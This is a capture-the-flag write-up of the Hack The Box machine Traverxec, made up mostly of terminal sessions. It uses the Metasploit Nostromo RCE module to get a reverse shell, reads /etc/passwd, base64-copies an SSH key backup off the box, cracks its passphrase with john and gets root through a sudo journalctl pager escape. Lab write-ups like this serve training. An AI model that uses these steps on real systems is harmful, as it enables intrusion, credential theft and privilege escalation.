---
title: Hackthebox - Traverxec
author: Rhovelionz
date: 2023-08-11 22:21:00 +0700
categories: [Hackthebox]
tags: [Nostromo, Ssh, Cve, ExploitDB, John]
image: /assets/img/Post/Traverxec.jpg
---

>   **Any actions and or activities related to the material contained within this Website is solely your responsibility. This site contains materials that can be potentially damaging or dangerous. If you do not fully understand something on this site, then GO OUT OF HERE! Refer to the laws in your province/country before accessing, using,or in any other way utilizing these materials.These materials are for educational and research purposes only.**


## **<span style='color:#E70B0B'>Summary</span>**
***
- Initial access by exploiting `Nostromo` Directory traversal. 
- Enumerating `Nostromo` config files.
- Getting `secret directory` in other user.
- Exploit sudo privilege on `journalctl` to get Root.

## **<span style='color:#E70B0B'>Port Scans</span>**
***
```terminal
root@BlackArchRH:~/Labs/HTB/Traverxec nmap -sC -sV -T4 10.10.10.165
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-13 00:05 WIB
Nmap scan report for 10.10.10.165
Host is up (0.023s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey:
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-title: TRAVERXEC
|_http-server-header: nostromo 1.9.6
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.78 seconds
root@BlackArchRH:~/Labs/HTB/Traverxec 
```

## **<span style='color:#E70B0B'>Website</span>**
***

`Nostromo` version 1.9.6 is running on the box, google search shows it’s vulnerable to `RCE` with directory traversal, there is an exploit for this vulnerability.

>  [Exploit For Nostromo V.1.9.6](https://www.exploit-db.com/exploits/47837)

![]({{ "/images/htb/traverxec/website.png" | relative_url }})


## **<span style='color:#E70B0B'>Enumeration</span>**
***

Firing `searchsploit` to search any exploit related to the nostromo.

```terminal
root@BlackArchRH:~/Labs/HTB/Traverxec  searchsploit nostromo
--------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                       |  Path
--------------------------------------------------------------------- ---------------------------------
Nostromo - Directory Traversal Remote Command Execution (Metasploit) | multiple/remote/47573.rb
nostromo 1.9.6 - Remote Code Execution                               | multiple/remote/47837.py
nostromo nhttpd 1.9.3 - Directory Traversal Remote Command Execution | linux/remote/35466.sh
--------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
root@BlackArchRH:~/Labs/HTB/Traverxec 
```

There are 3 of vulnerability but we are going to use one with RCE.
After copied the exploit to the directory and analyze it, we might be able to run it with Metasploit.

```terminal
root@BlackArchRH:~/Labs/HTB/Traverxec  searchsploit -m multiple/remote/47837.py .
  Exploit: nostromo 1.9.6 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/47837
     Path: /usr/share/exploitdb/exploits/multiple/remote/47837.py
    Codes: CVE-2019-16278
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /home/rh/Labs/HTB/Traverxec/47837.py


  Exploit:
      URL: https://www.exploit-db.com/exploits/47837
     Path: /usr/share/exploitdb/exploits/multiple/remote/47837.py
    Codes: N/A
 Verified: False
File Type: Python script, ASCII text executable
cp: overwrite '/home/rh/Labs/HTB/Traverxec/47837.py'?
Copied to: /home/rh/Labs/HTB/Traverxec/47837.py


root@BlackArchRH:~/Labs/HTB/Traverxec  
```

## **<span style='color:#E70B0B'>Exploit</span>**
***

We will fire up metasploit using `msfconsole`
Once metasploit is loaded search for the exploit using search `nostromo`.


```terminal
root@BlackArchRH:~/Labs/HTB/Traverxec  

msf6 > search nostromo

Matching Modules
================

   #  Name                                   Disclosure Date  Rank  Check  Description
   -  ----                                   ---------------  ----  -----  -----------
   0  exploit/multi/http/nostromo_code_exec  2019-10-20       good  Yes    Nostromo Directory Traversal Remote Command Execution

msf6 > use 0

msf6 exploit(multi/http/nostromo_code_exec) > show options

Module options (exploit/multi/http/nostromo_code_exec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using
                                       -metasploit/basics/using-metasploit.html
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generate
                                       d)
   URIPATH                   no        The URI to use for this exploit (default is random)
   VHOST                     no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be
                                        an address on the local machine or 0.0.0.0 to listen on all a
                                       ddresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Unix In-Memory)



View the full module info with the info, or info -d command.
```

The only parameter that I have to set is the **rhost** with the IP address of the target and the **lhost** value with my IP address.

```terminal
msf6 exploit(multi/http/nostromo_code_exec) > set RHOSTS 10.10.10.165
RHOSTS => 10.10.10.165
msf6 exploit(multi/http/nostromo_code_exec) > set LHOST 10.10.14.68
LHOST => 10.10.14.68
```

## **<span style='color:#E70B0B'>Low Priv User</span>**
***

```terminal
msf6 exploit(multi/http/nostromo_code_exec) > exploit

[*] Started reverse TCP handler on 10.10.14.68:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Configuring Automatic (Unix In-Memory) target
[*] Sending cmd/unix/reverse_perl command payload
[*] Command shell session 1 opened (10.10.14.68:4444 -> 10.10.10.165:41770) at 2023-08-13 00:19:05 +0700
id


uid=33(www-data) gid=33(www-data) groups=33(www-data)

python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=XTERM
```

After upgrading shell and fixing the terminal, we can checkout what's inside.
Enumerating the filesystem, we find the configuration file `nhttpd.conf`

```terminal
www-data@traverxec:/var$ ls
ls
backups  cache  lib  local  lock  log  mail  nostromo  opt  run  spool  tmp
www-data@traverxec:/var$

www-data@traverxec:/var$ cd nostromo
cd nostromo
www-data@traverxec:/var/nostromo$ ls
ls
conf  htdocs  icons  logs
www-data@traverxec:/var/nostromo$ cd conf
cd conf
www-data@traverxec:/var/nostromo/conf$ ls
ls
mimes  nhttpd.conf
www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf
cat nhttpd.conf
# MAIN [MANDATORY]

servername              traverxec.htb
serverlisten            *
serveradmin             david@traverxec.htb
serverroot              /var/nostromo
servermimes             conf/mimes
docroot                 /var/nostromo/htdocs
docindex                index.html

# LOGS [OPTIONAL]

logpid                  logs/nhttpd.pid

# SETUID [RECOMMENDED]

user                    www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess                .htaccess
htpasswd                /var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons                  /var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs                /home
homedirs_public         public_www
www-data@traverxec:/var/nostromo/conf$
```

There is a directory called ***public_www*** which is not default by the system.

Checking the `/etc/passwd` shows `David` also the user in the system.

```terminal
www-data@traverxec:/var/nostromo/conf$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
david:x:1000:1000:david,,,:/home/david:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
www-data@traverxec:/var/nostromo/conf$
```

Guessing the next step could be **SSH**, so it's worth to check it out.

```terminal
www-data@traverxec:/var/nostromo/conf$ ls -la /home/david/public_www
ls -la /home/david/public_www
total 16
drwxr-xr-x 3 david david 4096 Oct 25  2019 .
drwx--x--x 6 david david 4096 Aug 12 12:52 ..
-rw-r--r-- 1 david david  402 Oct 25  2019 index.html
drwxr-xr-x 2 david david 4096 Oct 25  2019 protected-file-area

www-data@traverxec:/var/nostromo/conf$ ls -la /home/david/public_www/protected-file-area
<$ ls -la /home/david/public_www/protected-file-area
total 16
drwxr-xr-x 2 david david 4096 Oct 25  2019 .
drwxr-xr-x 3 david david 4096 Oct 25  2019 ..
-rw-r--r-- 1 david david   45 Oct 25  2019 .htaccess
-rw-r--r-- 1 david david 1915 Oct 25  2019 backup-ssh-identity-files.tgz
```

There is a file called `backup-ssh-identity-files.tgz`, we use ***base64 -w0*** to encode the file and copy into our machine to unzip.

```terminal
www-data@traverxec:/home/david/public_www/protected-file-area$ cat backup-ssh-identity-files.tgz | base64 -w0
H4sIAANjs10AA+2YWc+jRhaG+5pf8d07HfYtV8O+Y8AYAzcROwabff/1425pNJpWMtFInWRm4uemgKJ0UL311jlF2T4zMI2Wewr+OI4l+Ol3AHpBQtCXFibxf2n/wScYxXGMIGCURD5BMELCyKcP/Pf4mG+ZxykaPj4+fZ2Df/Peb/X/j1J+o380T2U73I8s/bnO9vG7xPgiMIFhv6o/AePf6E9AxEt/6LtE/w3+4vq/NP88jNEH84JFzSPi4D1BhC+3PGMz7JfHjM2N/jAadgJdSVjy/NeVew4UGQkXbu02dzPh6hzE7jwt5h64paBUQcd5I85rZXhHBnNuFCo8CTsocnTcPbm7OkUttG1KrEJIcpKJHkYjRhzchYAl5rjjTeZjeoUIYKeUKaqyYuAo9kqTHEEYZ/Tq9ZuWNNLALUFTqotmrGRzcRQw8V1LZoRmvUIn84YcrKakVOI4+iaJu4HRXcWH1sh4hfTIU5ZHKWjxIjo1BhV0YXTh3TCUWr5IerpwJh5mCVNtdTlybjJ2r53ZXvRbVaPNjecjp1oJY3s6k15TJWQY5Em5s0HyGrHE9tFJuIG3BiQuZbTa2WSSsJaEWHX1NhN9noI66mX+4+ua+ts0REs2bFkC/An6f+v/e/rzazl83xhfPf7r+z+KYsQ//Y/iL/9jMIS//f9H8PkLrCAp5odzYT4sR/EYV/jQhOBrD2ANbfLZ3bvspw/sB8HknMByBR7gBe2z0uTtTx+McPkMI9RnjuV+wEhSEESRZXBCpHmEQnkUo1/68jgPURwmAsCY7ZkM5pkE0+7jGhnpIocaiPT5TnXrmg70WJD4hpVWp6pUEM3lrR04E9Mt1TutOScB03xnrTzcT6FVP/T63GRKUbTDrNeedMNqjMDhbs3qsKlGl1IMA62aVDcvTl1tnOujN0A7brQnWnN1scNGNmi1bAmVOlO6ezxOIyFVViduVYswA9JYa9XmqZ1VFpudydpfefEKOOq1S0Zm6mQm9iNVoXVx9ymltKl8cM9nfWaN53wR1vKgNa9akfqus/quXU7j1aVBjwRk2ZNvGBmAgicWg+BrM3S2qEGcgqtun8iabPKYzGWl0FSQsIMwI+gBYnzhPC0YdigJEMBnQxp2u8M575gSTtb3C0hLo8NCKeROjz5AdL8+wc0cWPsequXeFAIZW3Q1dqfytc+krtN7vdtY5KFQ0q653kkzCwZ6ktebbV5OatEvF5sO+CpUVvHBUNWmWrQ8zreb70KhCRDdMwgTcDBrTnggD7BV40hl0coCYel2tGCPqz5DVNU+pPQW8iYe+4iAFEeacFaK92dgW48mIqoRqY2U2xTH9IShWS4Sq7AXaATPjd/JjepWxlD3xWDduExncmgTLLeop/4OAzaiGGpf3mi9vo4YNZ4OEsmY8kE1kZAXzSmP7SduGCG4ESw3bxfzxoh9M1eYw+hV2hDAHSGLbHTqbWsuRojzT9s3hkFh51lXiUIuqmGOuC4tcXkWZCG/vkbHahurDGpmC465QH5kzORQg6fKD25u8eo5E+V96qWx2mVRBcuLGEzxGeeeoQOVxu0BH56NcrFZVtlrVhkgPorLcaipFsQST097rqEH6iS1VxYeXwiG6LC43HOnXeZ3Jz5d8TpC9eRRuPBwPiFjC8z8ncj9fWFY/5RhAvZY1bBlJ7kGzd54JbMspqfUPNde7KZigtS36aApT6T31qSQmVIApga1c9ORj0NuHIhMl5QnYOeQ6ydKDosbDNdsi2QVw6lUdlFiyK9blGcUvBAPwjGoEaA5dhC6k64xDKIOGm4hEDv04mzlN38RJ+esB1kn0ZlsipmJzcY4uyCOP+K8wS8YDF6BQVqhaQuUxntmugM56hklYxQso4sy7ElUU3p4iBfras5rLybx5lC2Kva9vpWRcUxzBGDPcz8wmSRaFsVfigB1uUfrGJB8B41Dtq5KMm2yhzhxcAYJl5fz4xQiRDP51jEzhXMFQEo6ihUnhNc0R25hTn0Qpf4wByp8N/mdGQRmPmmLF5bBI6jKiy7mLbI76XmW2CfN+IBqmVm0rRDvU9dVihl7v0I1RmcWK2ZCYZe0KSRBVnCt/JijvovyLdiQBDe6AG6cgjoBPnvEukh3ibGFd+Y2jFh8u/ZMm/q5cCXEcCHTMZrciH6sMoRFFYj3mxCr8zoz8w3XS6A8O0y4xPKsbNzRZH3vVBdsMp0nVIv0rOC3OtfgTH8VToU/eXl+JhaeR5+Ja+pwZ885cLEgqV9sOL2z980ytld9cr8/naK4ronUpOjDYVkbMcz1NuG0M9zREGPuUJfHsEa6y9kAKjiysZfjPJ+a2baPreUGga1d1TG35A7mL4R9SuIIFBvJDLdSdqgqkSnIi8wLRtDTBHhZ0NzFK+hKjaPxgW7LyAY1d3hic2jVzrrgBBD3sknSz4fT3irm6Zqg5SFeLGgaD67A12wlmPwvZ7E/O8v+9/LL9d+P3Rx/vxj/0fmPwL7Uf19+F7zrvz+A9/nvr33+e/PmzZs3b968efPmzZs3b968efPmzf8vfweR13qfACgAAA==
```
## **<span style='color:#E70B0B'>Cracking</span>**
***

Decode it in our machine to get the file, there are ssh file to `david` which included public and private keys.

```terminal
root@BlackArchRH:~/Labs/HTB/Traverxec  cat encodedssh.txt| base64 -d > backup-ssh-identity-files.tgz
root@BlackArchRH:~/Labs/HTB/Traverxec  ls
 .   ..   47837.py   backup-ssh-identity-files.tgz   david_pass   encodedssh.txt
root@BlackArchRH:~/Labs/HTB/Traverxec  tar -xvf backup-ssh-identity-files.tgz
home/david/.ssh/
home/david/.ssh/authorized_keys
home/david/.ssh/id_rsa
home/david/.ssh/id_rsa.pub
root@BlackArchRH:~/Labs/HTB/Traverxec 
```

Cracking the **id_rsa** with `ssh2john`

```
root@BlackArchRH:~/Labs/HTB/Traverxec/home/david/.ssh  python ~/Tools/Script/ssh2john.py id_rsa > id_rsa.hash
```
And crack it with `john`, we found the password of ssh to user `david`.

```terminal
root@BlackArchRH:~/Labs/HTB/Traverxec/home/david/.ssh  john id_rsa.hash --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
Use the "--format=ssh-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (id_rsa)
Warning: Only 1 candidate left, minimum 4 needed for performance.
1g 0:00:00:21 DONE (2023-08-13 00:47) 0.04748g/s 680992p/s 680992c/s 680992C/s *7¡Vamos!
Session completed
```
## **<span style='color:#E70B0B'>Getting User</span>**
***

Ssh with user `david` and we found there is a directory called `bin`

```terminal
david@traverxec:~$ ls -la
total 40
drwx--x--x 6 david david 4096 Aug 12 12:52 .
drwxr-xr-x 3 root  root  4096 Oct 25  2019 ..
lrwxrwxrwx 1 root  root     9 Oct 25  2019 .bash_history -> /dev/null
-rw-r--r-- 1 david david  220 Oct 25  2019 .bash_logout
-rw-r--r-- 1 david david 3526 Oct 25  2019 .bashrc
drwx------ 2 david david 4096 Aug 12 13:02 bin
drwxr-xr-x 3 david david 4096 Aug 12 12:52 .local
-rw-r--r-- 1 david david  807 Oct 25  2019 .profile
drwxr-xr-x 3 david david 4096 Oct 25  2019 public_www
drwx------ 2 david david 4096 Oct 25  2019 .ssh
-r--r----- 1 root  david   33 Aug 11 02:00 user.txt
```

It's clearly that we have to bypass the **nostromo.service** to get root, since this is easy machine, there are no difficult things to do other than straight to the root access, by guessing we can abuse the `journalctl`, we look up in `GTFOBINS` and found an one-line command to bypass it.

>  [JournalCTL byposs by GTFOBINS](https://gtfobins.github.io/gtfobins/journalctl/)


```terminal
david@traverxec:~$ cd bin
david@traverxec:~/bin$ ls
server-stats.head  server-stats.sh
david@traverxec:~/bin$ cat server-stats.sh
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
david@traverxec:~/bin$
```
## **<span style='color:#E70B0B'>Getting Root</span>**
***

So we execute the command that was written in **server-stats.sh** and execute `!/bin/sh`

```terminal
david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Fri 2023-08-11 02:00:33 EDT, end at Sat 2023-08-12 13:55:34 EDT. --
Aug 12 12:34:04 traverxec sudo[32408]: pam_unix(sudo:auth): authentication failure; logname= uid=33 eui
Aug 12 12:34:05 traverxec sudo[32408]: pam_unix(sudo:auth): conversation failed
Aug 12 12:34:05 traverxec sudo[32408]: pam_unix(sudo:auth): auth could not identify password for [www-d
Aug 12 12:34:05 traverxec sudo[32408]: www-data : command not allowed ; TTY=pts/2 ; PWD=/tmp ; USER=roo
Aug 12 12:34:05 traverxec nologin[32451]: Attempted login by UNKNOWN on UNKNOWN
!/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
#
```

***

![]({{ "/images/mandatory/pwned.png" | relative_url }})
